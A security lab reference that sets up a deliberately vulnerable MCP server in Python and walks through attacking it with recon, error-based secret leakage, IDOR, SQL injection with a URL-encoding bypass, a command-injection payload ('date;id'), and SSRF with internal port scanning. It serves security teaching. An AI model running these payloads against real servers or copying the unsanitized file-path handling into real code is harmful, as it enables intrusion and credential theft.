# Vulnerable MCP Practical Lab — Summary & Reference

## 1. Environment Setup

```bash
# Create and activate a virtual environment
python3 -m venv mcp-lab
source mcp-lab/bin/activate

# Install the required package
pip3 install fastmcp
```

---

## 2. MCP Server

The server exposes the three core MCP capabilities — **prompts**, **resources**, and **tools** — using `fastmcp` decorators.

### `server.py`

```python
from fastmcp import FastMCP
from glob import glob

mcp = FastMCP("MCP")

# Prompt — returns a spell-check prompt for a given text
@mcp.prompt()
def spell_check(text: str) -> str:
    """Generates a user message asking for a spell check of an input text."""
    return f"Please check the following text for typos and grammatical errors:\n\n{text}"

# Resource — static URI returning the number of stored files
@mcp.resource("resource://filecount")
def count_files() -> int:
    """Provides the number of stored files."""
    return len(glob("/tmp/*.mcpfile"))

# Resource Template — dynamic URI to retrieve a file's content
@mcp.resource("getfile://{file_name}")
def get_file(file_name: str) -> str:
    """Get content of a stored file."""
    with open(f"/tmp/{file_name}.mcpfile", "r") as f:
        return f.read()

# Tool — stores content to a file on disk
@mcp.tool()
def store_file(file_content: str, file_name: str) -> str:
    """Store a file."""
    with open(f"/tmp/{file_name}.mcpfile", "w+") as f:
        f.write(file_content)
    return file_content

mcp.run(transport="streamable-http", host="127.0.0.1", port=8000)
```

```bash
python3 server.py
```

The server starts on `http://127.0.0.1:8000` using Streamable HTTP transport.

---

## 2. Reconnaissance Client
 
Enumerate all server capabilities before testing. This is always the first step.
 
### `recon.py`
 
```python
import asyncio
from fastmcp import Client
 
client = Client("http://<TARGET_IP>:8000/mcp/")
 
async def main():
    async with client:
        resources = await client.list_resources()
        resource_templates = await client.list_resource_templates()
        tools = await client.list_tools()
 
        print("Resources:")
        for r in resources:
            print(f"  *** {r.name}")
            print(f"      {r.description.strip()}")
 
        print("-" * 50)
        print("Resource Templates:")
        for rt in resource_templates:
            print(f"  *** {rt.uriTemplate}")
            print(f"      {rt.description.strip()}")
 
        print("-" * 50)
        print("Tools:")
        for t in tools:
            params = list(t.inputSchema.get('properties', {}).keys())
            print(f"  *** {t.name}({', '.join(params)})")
            print(f"      {t.description.strip()}")
 
asyncio.run(main())
```
 
---
 
## 3. Vulnerability Classes
 
### 3a. Sensitive Information Disclosure
 
MCP servers interact with external systems and may leak credentials, API keys, or tokens through verbose error messages, stack traces, or exposed log resources.
 
**Attack surface:**
 
- Log resources (`resource://logs`) may contain internal details, valid item names, error context.
- Provoking errors with invalid input can trigger verbose exceptions that leak request details.
**Example — trigger an error to leak an API key:**
 
```python
async def main():
    async with client:
        try:
            result = await client.read_resource("quantity://asd!")
            print(result[0].text)
        except Exception as e:
            print(f"[-] {e}")
```
 
A poorly handled exception may return the full outbound HTTP request including headers:
 
```
Quantity API Error: Requests details: 'http://quantityapi.local/api/item/asd!'
{'Content-Type': 'application/json', 'User-Agent': 'MCP Server 1.0.0',
 'X-Api-Key': '7f1db571858da4cf0af43645812e1997'}
```
 
**Checklist:**
 
- Read every exposed resource, especially logs and debug endpoints.
- Send malformed / unexpected input to every resource template and tool.
- Inspect error responses for leaked URLs, headers, credentials, or stack traces.
---
 
### 3b. Broken Authorization (IDOR)
 
Resources that accept user-controlled identifiers (e.g., `document://{doc_id}`) may not enforce per-user authorization, allowing access to other users' data by iterating or guessing IDs.
 
```python
# Attempt to access another user's document
result = await client.read_resource("document://1001")
```
 
**Note:** This is less common than other MCP vulns because the server's own API key / token usually scopes access. It becomes relevant when the MCP server has broad access and relies on client-side trust for authorization.
 
---
 
### 3c. SQL Injection
 
Resource templates that pass user input to a backend database (directly or via an API) may be vulnerable to SQLi.
 
**Confirm the vulnerability:**
 
```python
# 1. Inject a single quote — expect an error
await client.read_resource("price://banana'")
 
# 2. Add a SQL comment — if normal result returns, SQLi confirmed
await client.read_resource("price://banana'--")
```
 
**Exploit with UNION SELECT (URL-encoded to bypass URI validation):**
 
```python
# Spaces are invalid in URIs — use %20
# Slashes are invalid — avoid SQL comments like /**/
payload = "price://x'%20UNION%20SELECT%201--"
result = await client.read_resource(payload)
print(result[0].text)  # Returns "1" — UNION injection confirmed
```
 
**Key bypass:** Pydantic URI validation rejects raw spaces and slashes. URL-encoding (`%20`) bypasses the space restriction while remaining valid in the HTTP request the server sends to the backend API.
 
---
 
### 3d. Command Injection
 
Tools that execute system commands with a whitelist may still be vulnerable if input is passed unsanitized to a shell.
 
**Test the whitelist:**
 
```python
# Allowed command — works
result = await client.call_tool("execute_server_command", {"command": "date"})
print(result.content[0].text)
 
# Non-whitelisted command — blocked
result = await client.call_tool("execute_server_command", {"command": "id"})
# Returns: "Invalid Command"
```
 
**Bypass with shell metacharacters:**
 
```python
# Common injection operators: ;  |  &&  ||  $()  `backticks`
result = await client.call_tool("execute_server_command", {"command": "date;id"})
print(result.content[0].text)
```
 
Expected output if vulnerable:
 
```
Tue May 13 09:56:30 UTC 2025
uid=0(root) gid=0(root) groups=0(root)
```
 
---
 
### 3e. Server-Side Request Forgery (SSRF)
 
Tools that fetch external URLs without validating the target allow an attacker to make the server issue requests to arbitrary hosts, including internal services.
 
**Confirm with an attacker-controlled listener:**
 
```bash
# On your machine
nc -lnvp 8000
```
 
```python
# Point the tool at your listener
result = await client.call_tool("fetch_price_data", {"url": "http://<ATTACKER_IP>:8000/ssrf"})
```
 
**Internal port scanning via response differentiation:**
 
```python
for port in [22, 80, 443, 3306, 5432, 6379, 8080]:
    try:
        result = await client.call_tool("fetch_price_data", {
            "url": f"http://127.0.0.1:{port}"
        })
        print(f"[+] Port {port} — OPEN ({result.content[0].text})")
    except Exception as e:
        print(f"[-] Port {port} — CLOSED/FILTERED")
```
 
- **Success response** → port open.
- **`Connection refused`** → port closed.
- **Timeout** → filtered.
---
 
## 4. Key Takeaways
 
- MCP servers operate **independently from the LLM** — anyone with network access can interact directly with resources and tools, no jailbreaking required.
- Always enumerate all capabilities first (`list_resources`, `list_resource_templates`, `list_tools`).
- Provoke errors deliberately — poor exception handling is the most common source of info disclosure.
- URI-based resource templates are subject to **Pydantic URL validation**; URL-encoding is the standard bypass for injection payloads.
- Command injection payloads work the same as in any shell context — test `;`, `|`, `&&`, `` ` ``, and `$()`.
- SSRF turns the MCP server into a proxy for internal network reconnaissance and service access.